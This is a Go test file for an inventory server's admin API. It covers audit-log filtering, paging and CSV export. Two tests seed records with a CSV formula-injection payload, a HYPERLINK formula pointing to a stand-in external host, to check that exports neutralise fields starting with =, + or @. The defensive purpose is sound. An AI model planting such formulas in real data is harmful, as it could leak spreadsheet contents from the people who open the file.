package httpapi

import (
	"encoding/json"
	"net/http"
	"strings"
	"testing"
	"time"

	"github.com/hkjang/invenqor/server/internal/storagetest"

	"github.com/google/uuid"
	"github.com/hkjang/invenqor/server/internal/storage"
)

// The console filtered the newest few hundred rows in the browser, so a search
// for an older event returned nothing and read as "no such record". These
// filters have to run in the query, and the response has to say how many entries
// actually match.
func TestAuditSearchFiltersInTheQueryAndReportsTheTotal(t *testing.T) {
	runtime := storagetest.Open(t)
	defer runtime.Close()
	server := testServer(t, runtime)
	cookie, csrf := authenticateInitialAdmin(t, server, runtime)

	// One event older than any page the console would fetch, plus enough newer
	// events to push it past a small limit.
	old := time.Now().UTC().Add(-30 * 24 * time.Hour)
	insertAuditEvent(t, runtime, "asset.delete", "old.actor", "failure", old)
	for index := 0; index < 30; index++ {
		insertAuditEvent(
			t, runtime, "asset.update", "recent.actor", "success",
			time.Now().UTC().Add(-time.Duration(index)*time.Minute),
		)
	}

	// A search must reach the old event even though it is far outside the page.
	found := decodeAudit(t, server, cookie, csrf,
		"/api/v1/admin/audit?limit=5&q=old.actor")
	if found.Total != 1 || len(found.Items) != 1 {
		t.Fatalf("search for an old actor found total=%d items=%d",
			found.Total, len(found.Items))
	}
	if found.Items[0].Action != "asset.delete" {
		t.Fatalf("search returned %+v", found.Items[0])
	}

	// The total describes the filter, not the page, so the console can page.
	page := decodeAudit(t, server, cookie, csrf,
		"/api/v1/admin/audit?limit=5&action=asset.update")
	if page.Total != 30 || len(page.Items) != 5 || !page.HasMore {
		t.Fatalf("action filter = total %d, items %d, has_more %v",
			page.Total, len(page.Items), page.HasMore)
	}
	second := decodeAudit(t, server, cookie, csrf,
		"/api/v1/admin/audit?limit=5&offset=5&action=asset.update")
	if second.Items[0].ID == page.Items[0].ID {
		t.Fatal("offset returned the same first row")
	}

	// A date window must be usable with a plain date, which is what an operator
	// types, and must include the whole of the end day.
	day := old.Format("2006-01-02")
	window := decodeAudit(t, server, cookie, csrf,
		"/api/v1/admin/audit?from="+day+"&to="+day)
	if window.Total != 1 {
		t.Fatalf("single-day window total = %d, want 1", window.Total)
	}

	// Filters must offer the values this installation records.
	if len(window.Facets.Actions) == 0 || len(window.Facets.Results) == 0 {
		t.Fatalf("facets = %+v", window.Facets)
	}
	failures := decodeAudit(t, server, cookie, csrf,
		"/api/v1/admin/audit?result=failure")
	if failures.Total != 1 {
		t.Fatalf("result filter total = %d, want 1", failures.Total)
	}

	// An unusable window is a bad request, not an empty page that looks like a
	// clean record.
	response := performAuthenticatedJSON(
		t, server, http.MethodGet,
		"/api/v1/admin/audit?from=yesterday", nil, cookie, csrf,
	)
	if response.Code != http.StatusBadRequest {
		t.Fatalf("unparseable from status = %d", response.Code)
	}
	response = performAuthenticatedJSON(
		t, server, http.MethodGet,
		"/api/v1/admin/audit?from=2026-07-10&to=2026-07-01", nil, cookie, csrf,
	)
	if response.Code != http.StatusBadRequest {
		t.Fatalf("reversed window status = %d", response.Code)
	}
}

// An audit extract is evidence, and transcribing rows out of a browser is how
// evidence gets copied wrongly.
func TestAuditExportWritesTheFilteredRowsAsCSV(t *testing.T) {
	runtime := storagetest.Open(t)
	defer runtime.Close()
	server := testServer(t, runtime)
	cookie, csrf := authenticateInitialAdmin(t, server, runtime)
	insertAuditEvent(
		t, runtime, "asset.delete", "csv.actor", "failure",
		time.Now().UTC().Add(-time.Hour),
	)

	response := performAuthenticatedJSON(
		t, server, http.MethodGet,
		"/api/v1/admin/audit.csv?q=csv.actor", nil, cookie, csrf,
	)
	if response.Code != http.StatusOK {
		t.Fatalf("export status = %d body = %s", response.Code, response.Body)
	}
	if contentType := response.Header().Get("Content-Type"); !strings.HasPrefix(
		contentType, "text/csv",
	) {
		t.Fatalf("Content-Type = %q", contentType)
	}
	if disposition := response.Header().Get("Content-Disposition"); !strings.Contains(
		disposition, "invenqor-audit.csv",
	) {
		t.Fatalf("Content-Disposition = %q", disposition)
	}
	body := response.Body.String()
	if !strings.HasPrefix(body, "\ufeff") {
		t.Fatal("export omitted the byte order mark spreadsheets need")
	}
	lines := strings.Split(strings.TrimSpace(body), "\n")
	if len(lines) != 2 {
		t.Fatalf("export wrote %d lines:\n%s", len(lines), body)
	}
	if !strings.Contains(lines[1], "csv.actor") ||
		!strings.Contains(lines[1], "asset.delete") {
		t.Fatalf("export row = %q", lines[1])
	}
	// The timestamp in the extract must be the zoned form, not a naive local
	// reading of a UTC value.
	if _, err := time.Parse(
		time.RFC3339, strings.Split(lines[1], ",")[0],
	); err != nil {
		t.Fatalf("export timestamp %q is not RFC 3339", lines[1])
	}
	// Taking an extract is itself an auditable action.
	listed := decodeAudit(t, server, cookie, csrf,
		"/api/v1/admin/audit?action=audit.export")
	if listed.Total != 1 {
		t.Fatalf("the export was not recorded in the audit log (total=%d)", listed.Total)
	}
}

type auditListing struct {
	Total   int64 `json:"total"`
	HasMore bool  `json:"has_more"`
	Items   []struct {
		ID     string `json:"id"`
		Action string `json:"action"`
	} `json:"items"`
	Facets struct {
		Actions       []statisticBucket `json:"actions"`
		ResourceTypes []statisticBucket `json:"resource_types"`
		Results       []statisticBucket `json:"results"`
	} `json:"facets"`
}

func decodeAudit(
	t *testing.T,
	server *Server,
	cookie *http.Cookie,
	csrf string,
	path string,
) auditListing {
	t.Helper()
	response := performAuthenticatedJSON(
		t, server, http.MethodGet, path, nil, cookie, csrf,
	)
	if response.Code != http.StatusOK {
		t.Fatalf("GET %s status = %d body = %s", path, response.Code, response.Body)
	}
	var listing auditListing
	if err := json.Unmarshal(response.Body.Bytes(), &listing); err != nil {
		t.Fatalf("decode %s: %v", path, err)
	}
	return listing
}

func insertAuditEvent(
	t *testing.T,
	runtime *storage.Runtime,
	action string,
	actor string,
	result string,
	occurred time.Time,
) {
	t.Helper()
	if _, err := runtime.DB().Exec(
		`INSERT INTO audit_logs(
			id, occurred_at, actor_type, actor_name, action, resource_type,
			resource_id, request_id, source_ip, user_agent, result, reason
		) VALUES ($1,$2,'user',$3,$4,'asset','asset-1','request-1',
		 '192.0.2.9','test',$5,'')`,
		uuid.NewString(), occurred, actor, action, result,
	); err != nil {
		t.Fatalf("insert audit event: %v", err)
	}
}

// The audit export is served as an attachment for someone to open in a
// spreadsheet, and Excel and LibreOffice execute a cell whose text begins with
// =, +, - or @. Two columns carry text a user chose: the reason typed on every
// change, and the actor name, which for a federated account is whatever the
// identity provider put in the claim.
//
// The reader is an auditor with more access than whoever wrote the value, and
// they are opening a file this product told them to download.
func TestAuditExportDoesNotHandTheSpreadsheetAFormula(t *testing.T) {
	runtime := storagetest.Open(t)
	defer runtime.Close()
	server := testServer(t, runtime)
	cookie, csrf := authenticateInitialAdmin(t, server, runtime)

	// Both columns a user chooses the text of: the reason typed on every change,
	// and the actor name, which for a federated account is a claim value.
	hostile := `=HYPERLINK("http://elsewhere/"&A1,"open")`
	if _, err := runtime.DB().Exec(
		`INSERT INTO audit_logs(
			id, occurred_at, actor_type, actor_name, action, resource_type,
			resource_id, request_id, source_ip, user_agent, result, reason
		) VALUES ($1,$2,'user',$3,'asset.delete','asset','asset-1','request-1',
		 '192.0.2.9','test','success',$4)`,
		uuid.NewString(), time.Now().UTC().Add(-time.Hour),
		"+"+hostile, hostile,
	); err != nil {
		t.Fatal(err)
	}

	response := performAuthenticatedJSON(
		t, server, http.MethodGet, "/api/v1/admin/audit.csv", nil, cookie, csrf,
	)
	if response.Code != http.StatusOK {
		t.Fatalf("export status = %d body = %s", response.Code, response.Body)
	}

	body := response.Body.String()
	if !strings.Contains(body, "HYPERLINK") {
		t.Fatalf("the recorded text did not reach the export at all: %s", body)
	}
	for _, line := range strings.Split(body, "\n") {
		for _, field := range strings.Split(line, ",") {
			trimmed := strings.TrimPrefix(strings.TrimSpace(field), `"`)
			if trimmed == "" {
				continue
			}
			switch trimmed[0] {
			case '=', '+', '@':
				t.Errorf(
					"a field begins with %q, which a spreadsheet evaluates: %s",
					trimmed[0], field,
				)
			}
		}
	}
}

// The asset export has the same shape as the audit one and the same reader: an
// administrator opening a downloaded file in a spreadsheet. The text here is
// what a monitored host reported for its name, and what an operator typed for
// the department and location.
func TestAssetExportDoesNotHandTheSpreadsheetAFormula(t *testing.T) {
	runtime := storagetest.Open(t)
	defer runtime.Close()
	server := testServer(t, runtime)
	cookie, csrf := authenticateInitialAdmin(t, server, runtime)

	hostile := `=HYPERLINK("http://elsewhere/"&A1,"open")`
	created := performAuthenticatedJSON(
		t, server, http.MethodPost, "/api/v1/assets",
		map[string]any{
			"asset_key": "host:export-probe",
			"name":      hostile,
			"type":      "host",
			// A department is free text on the asset editor's form.
			"owner_department": "@" + hostile,
			"location":         "+" + hostile,
		},
		cookie, csrf,
	)
	if created.Code != http.StatusCreated && created.Code != http.StatusOK {
		t.Fatalf("seeding the asset failed: %d %s", created.Code, created.Body.String())
	}

	response := performAuthenticatedJSON(
		t, server, http.MethodGet, "/api/v1/assets.csv", nil, cookie, csrf,
	)
	if response.Code != http.StatusOK {
		t.Fatalf("export status = %d body = %s", response.Code, response.Body)
	}

	body := response.Body.String()
	if !strings.Contains(body, "HYPERLINK") {
		t.Fatalf("the recorded text did not reach the export at all: %s", body)
	}
	for _, line := range strings.Split(body, "\n") {
		for _, field := range strings.Split(line, ",") {
			trimmed := strings.TrimPrefix(strings.TrimSpace(field), `"`)
			if trimmed == "" {
				continue
			}
			switch trimmed[0] {
			case '=', '+', '@':
				t.Errorf(
					"a field begins with %q, which a spreadsheet evaluates: %s",
					trimmed[0], field,
				)
			}
		}
	}
}
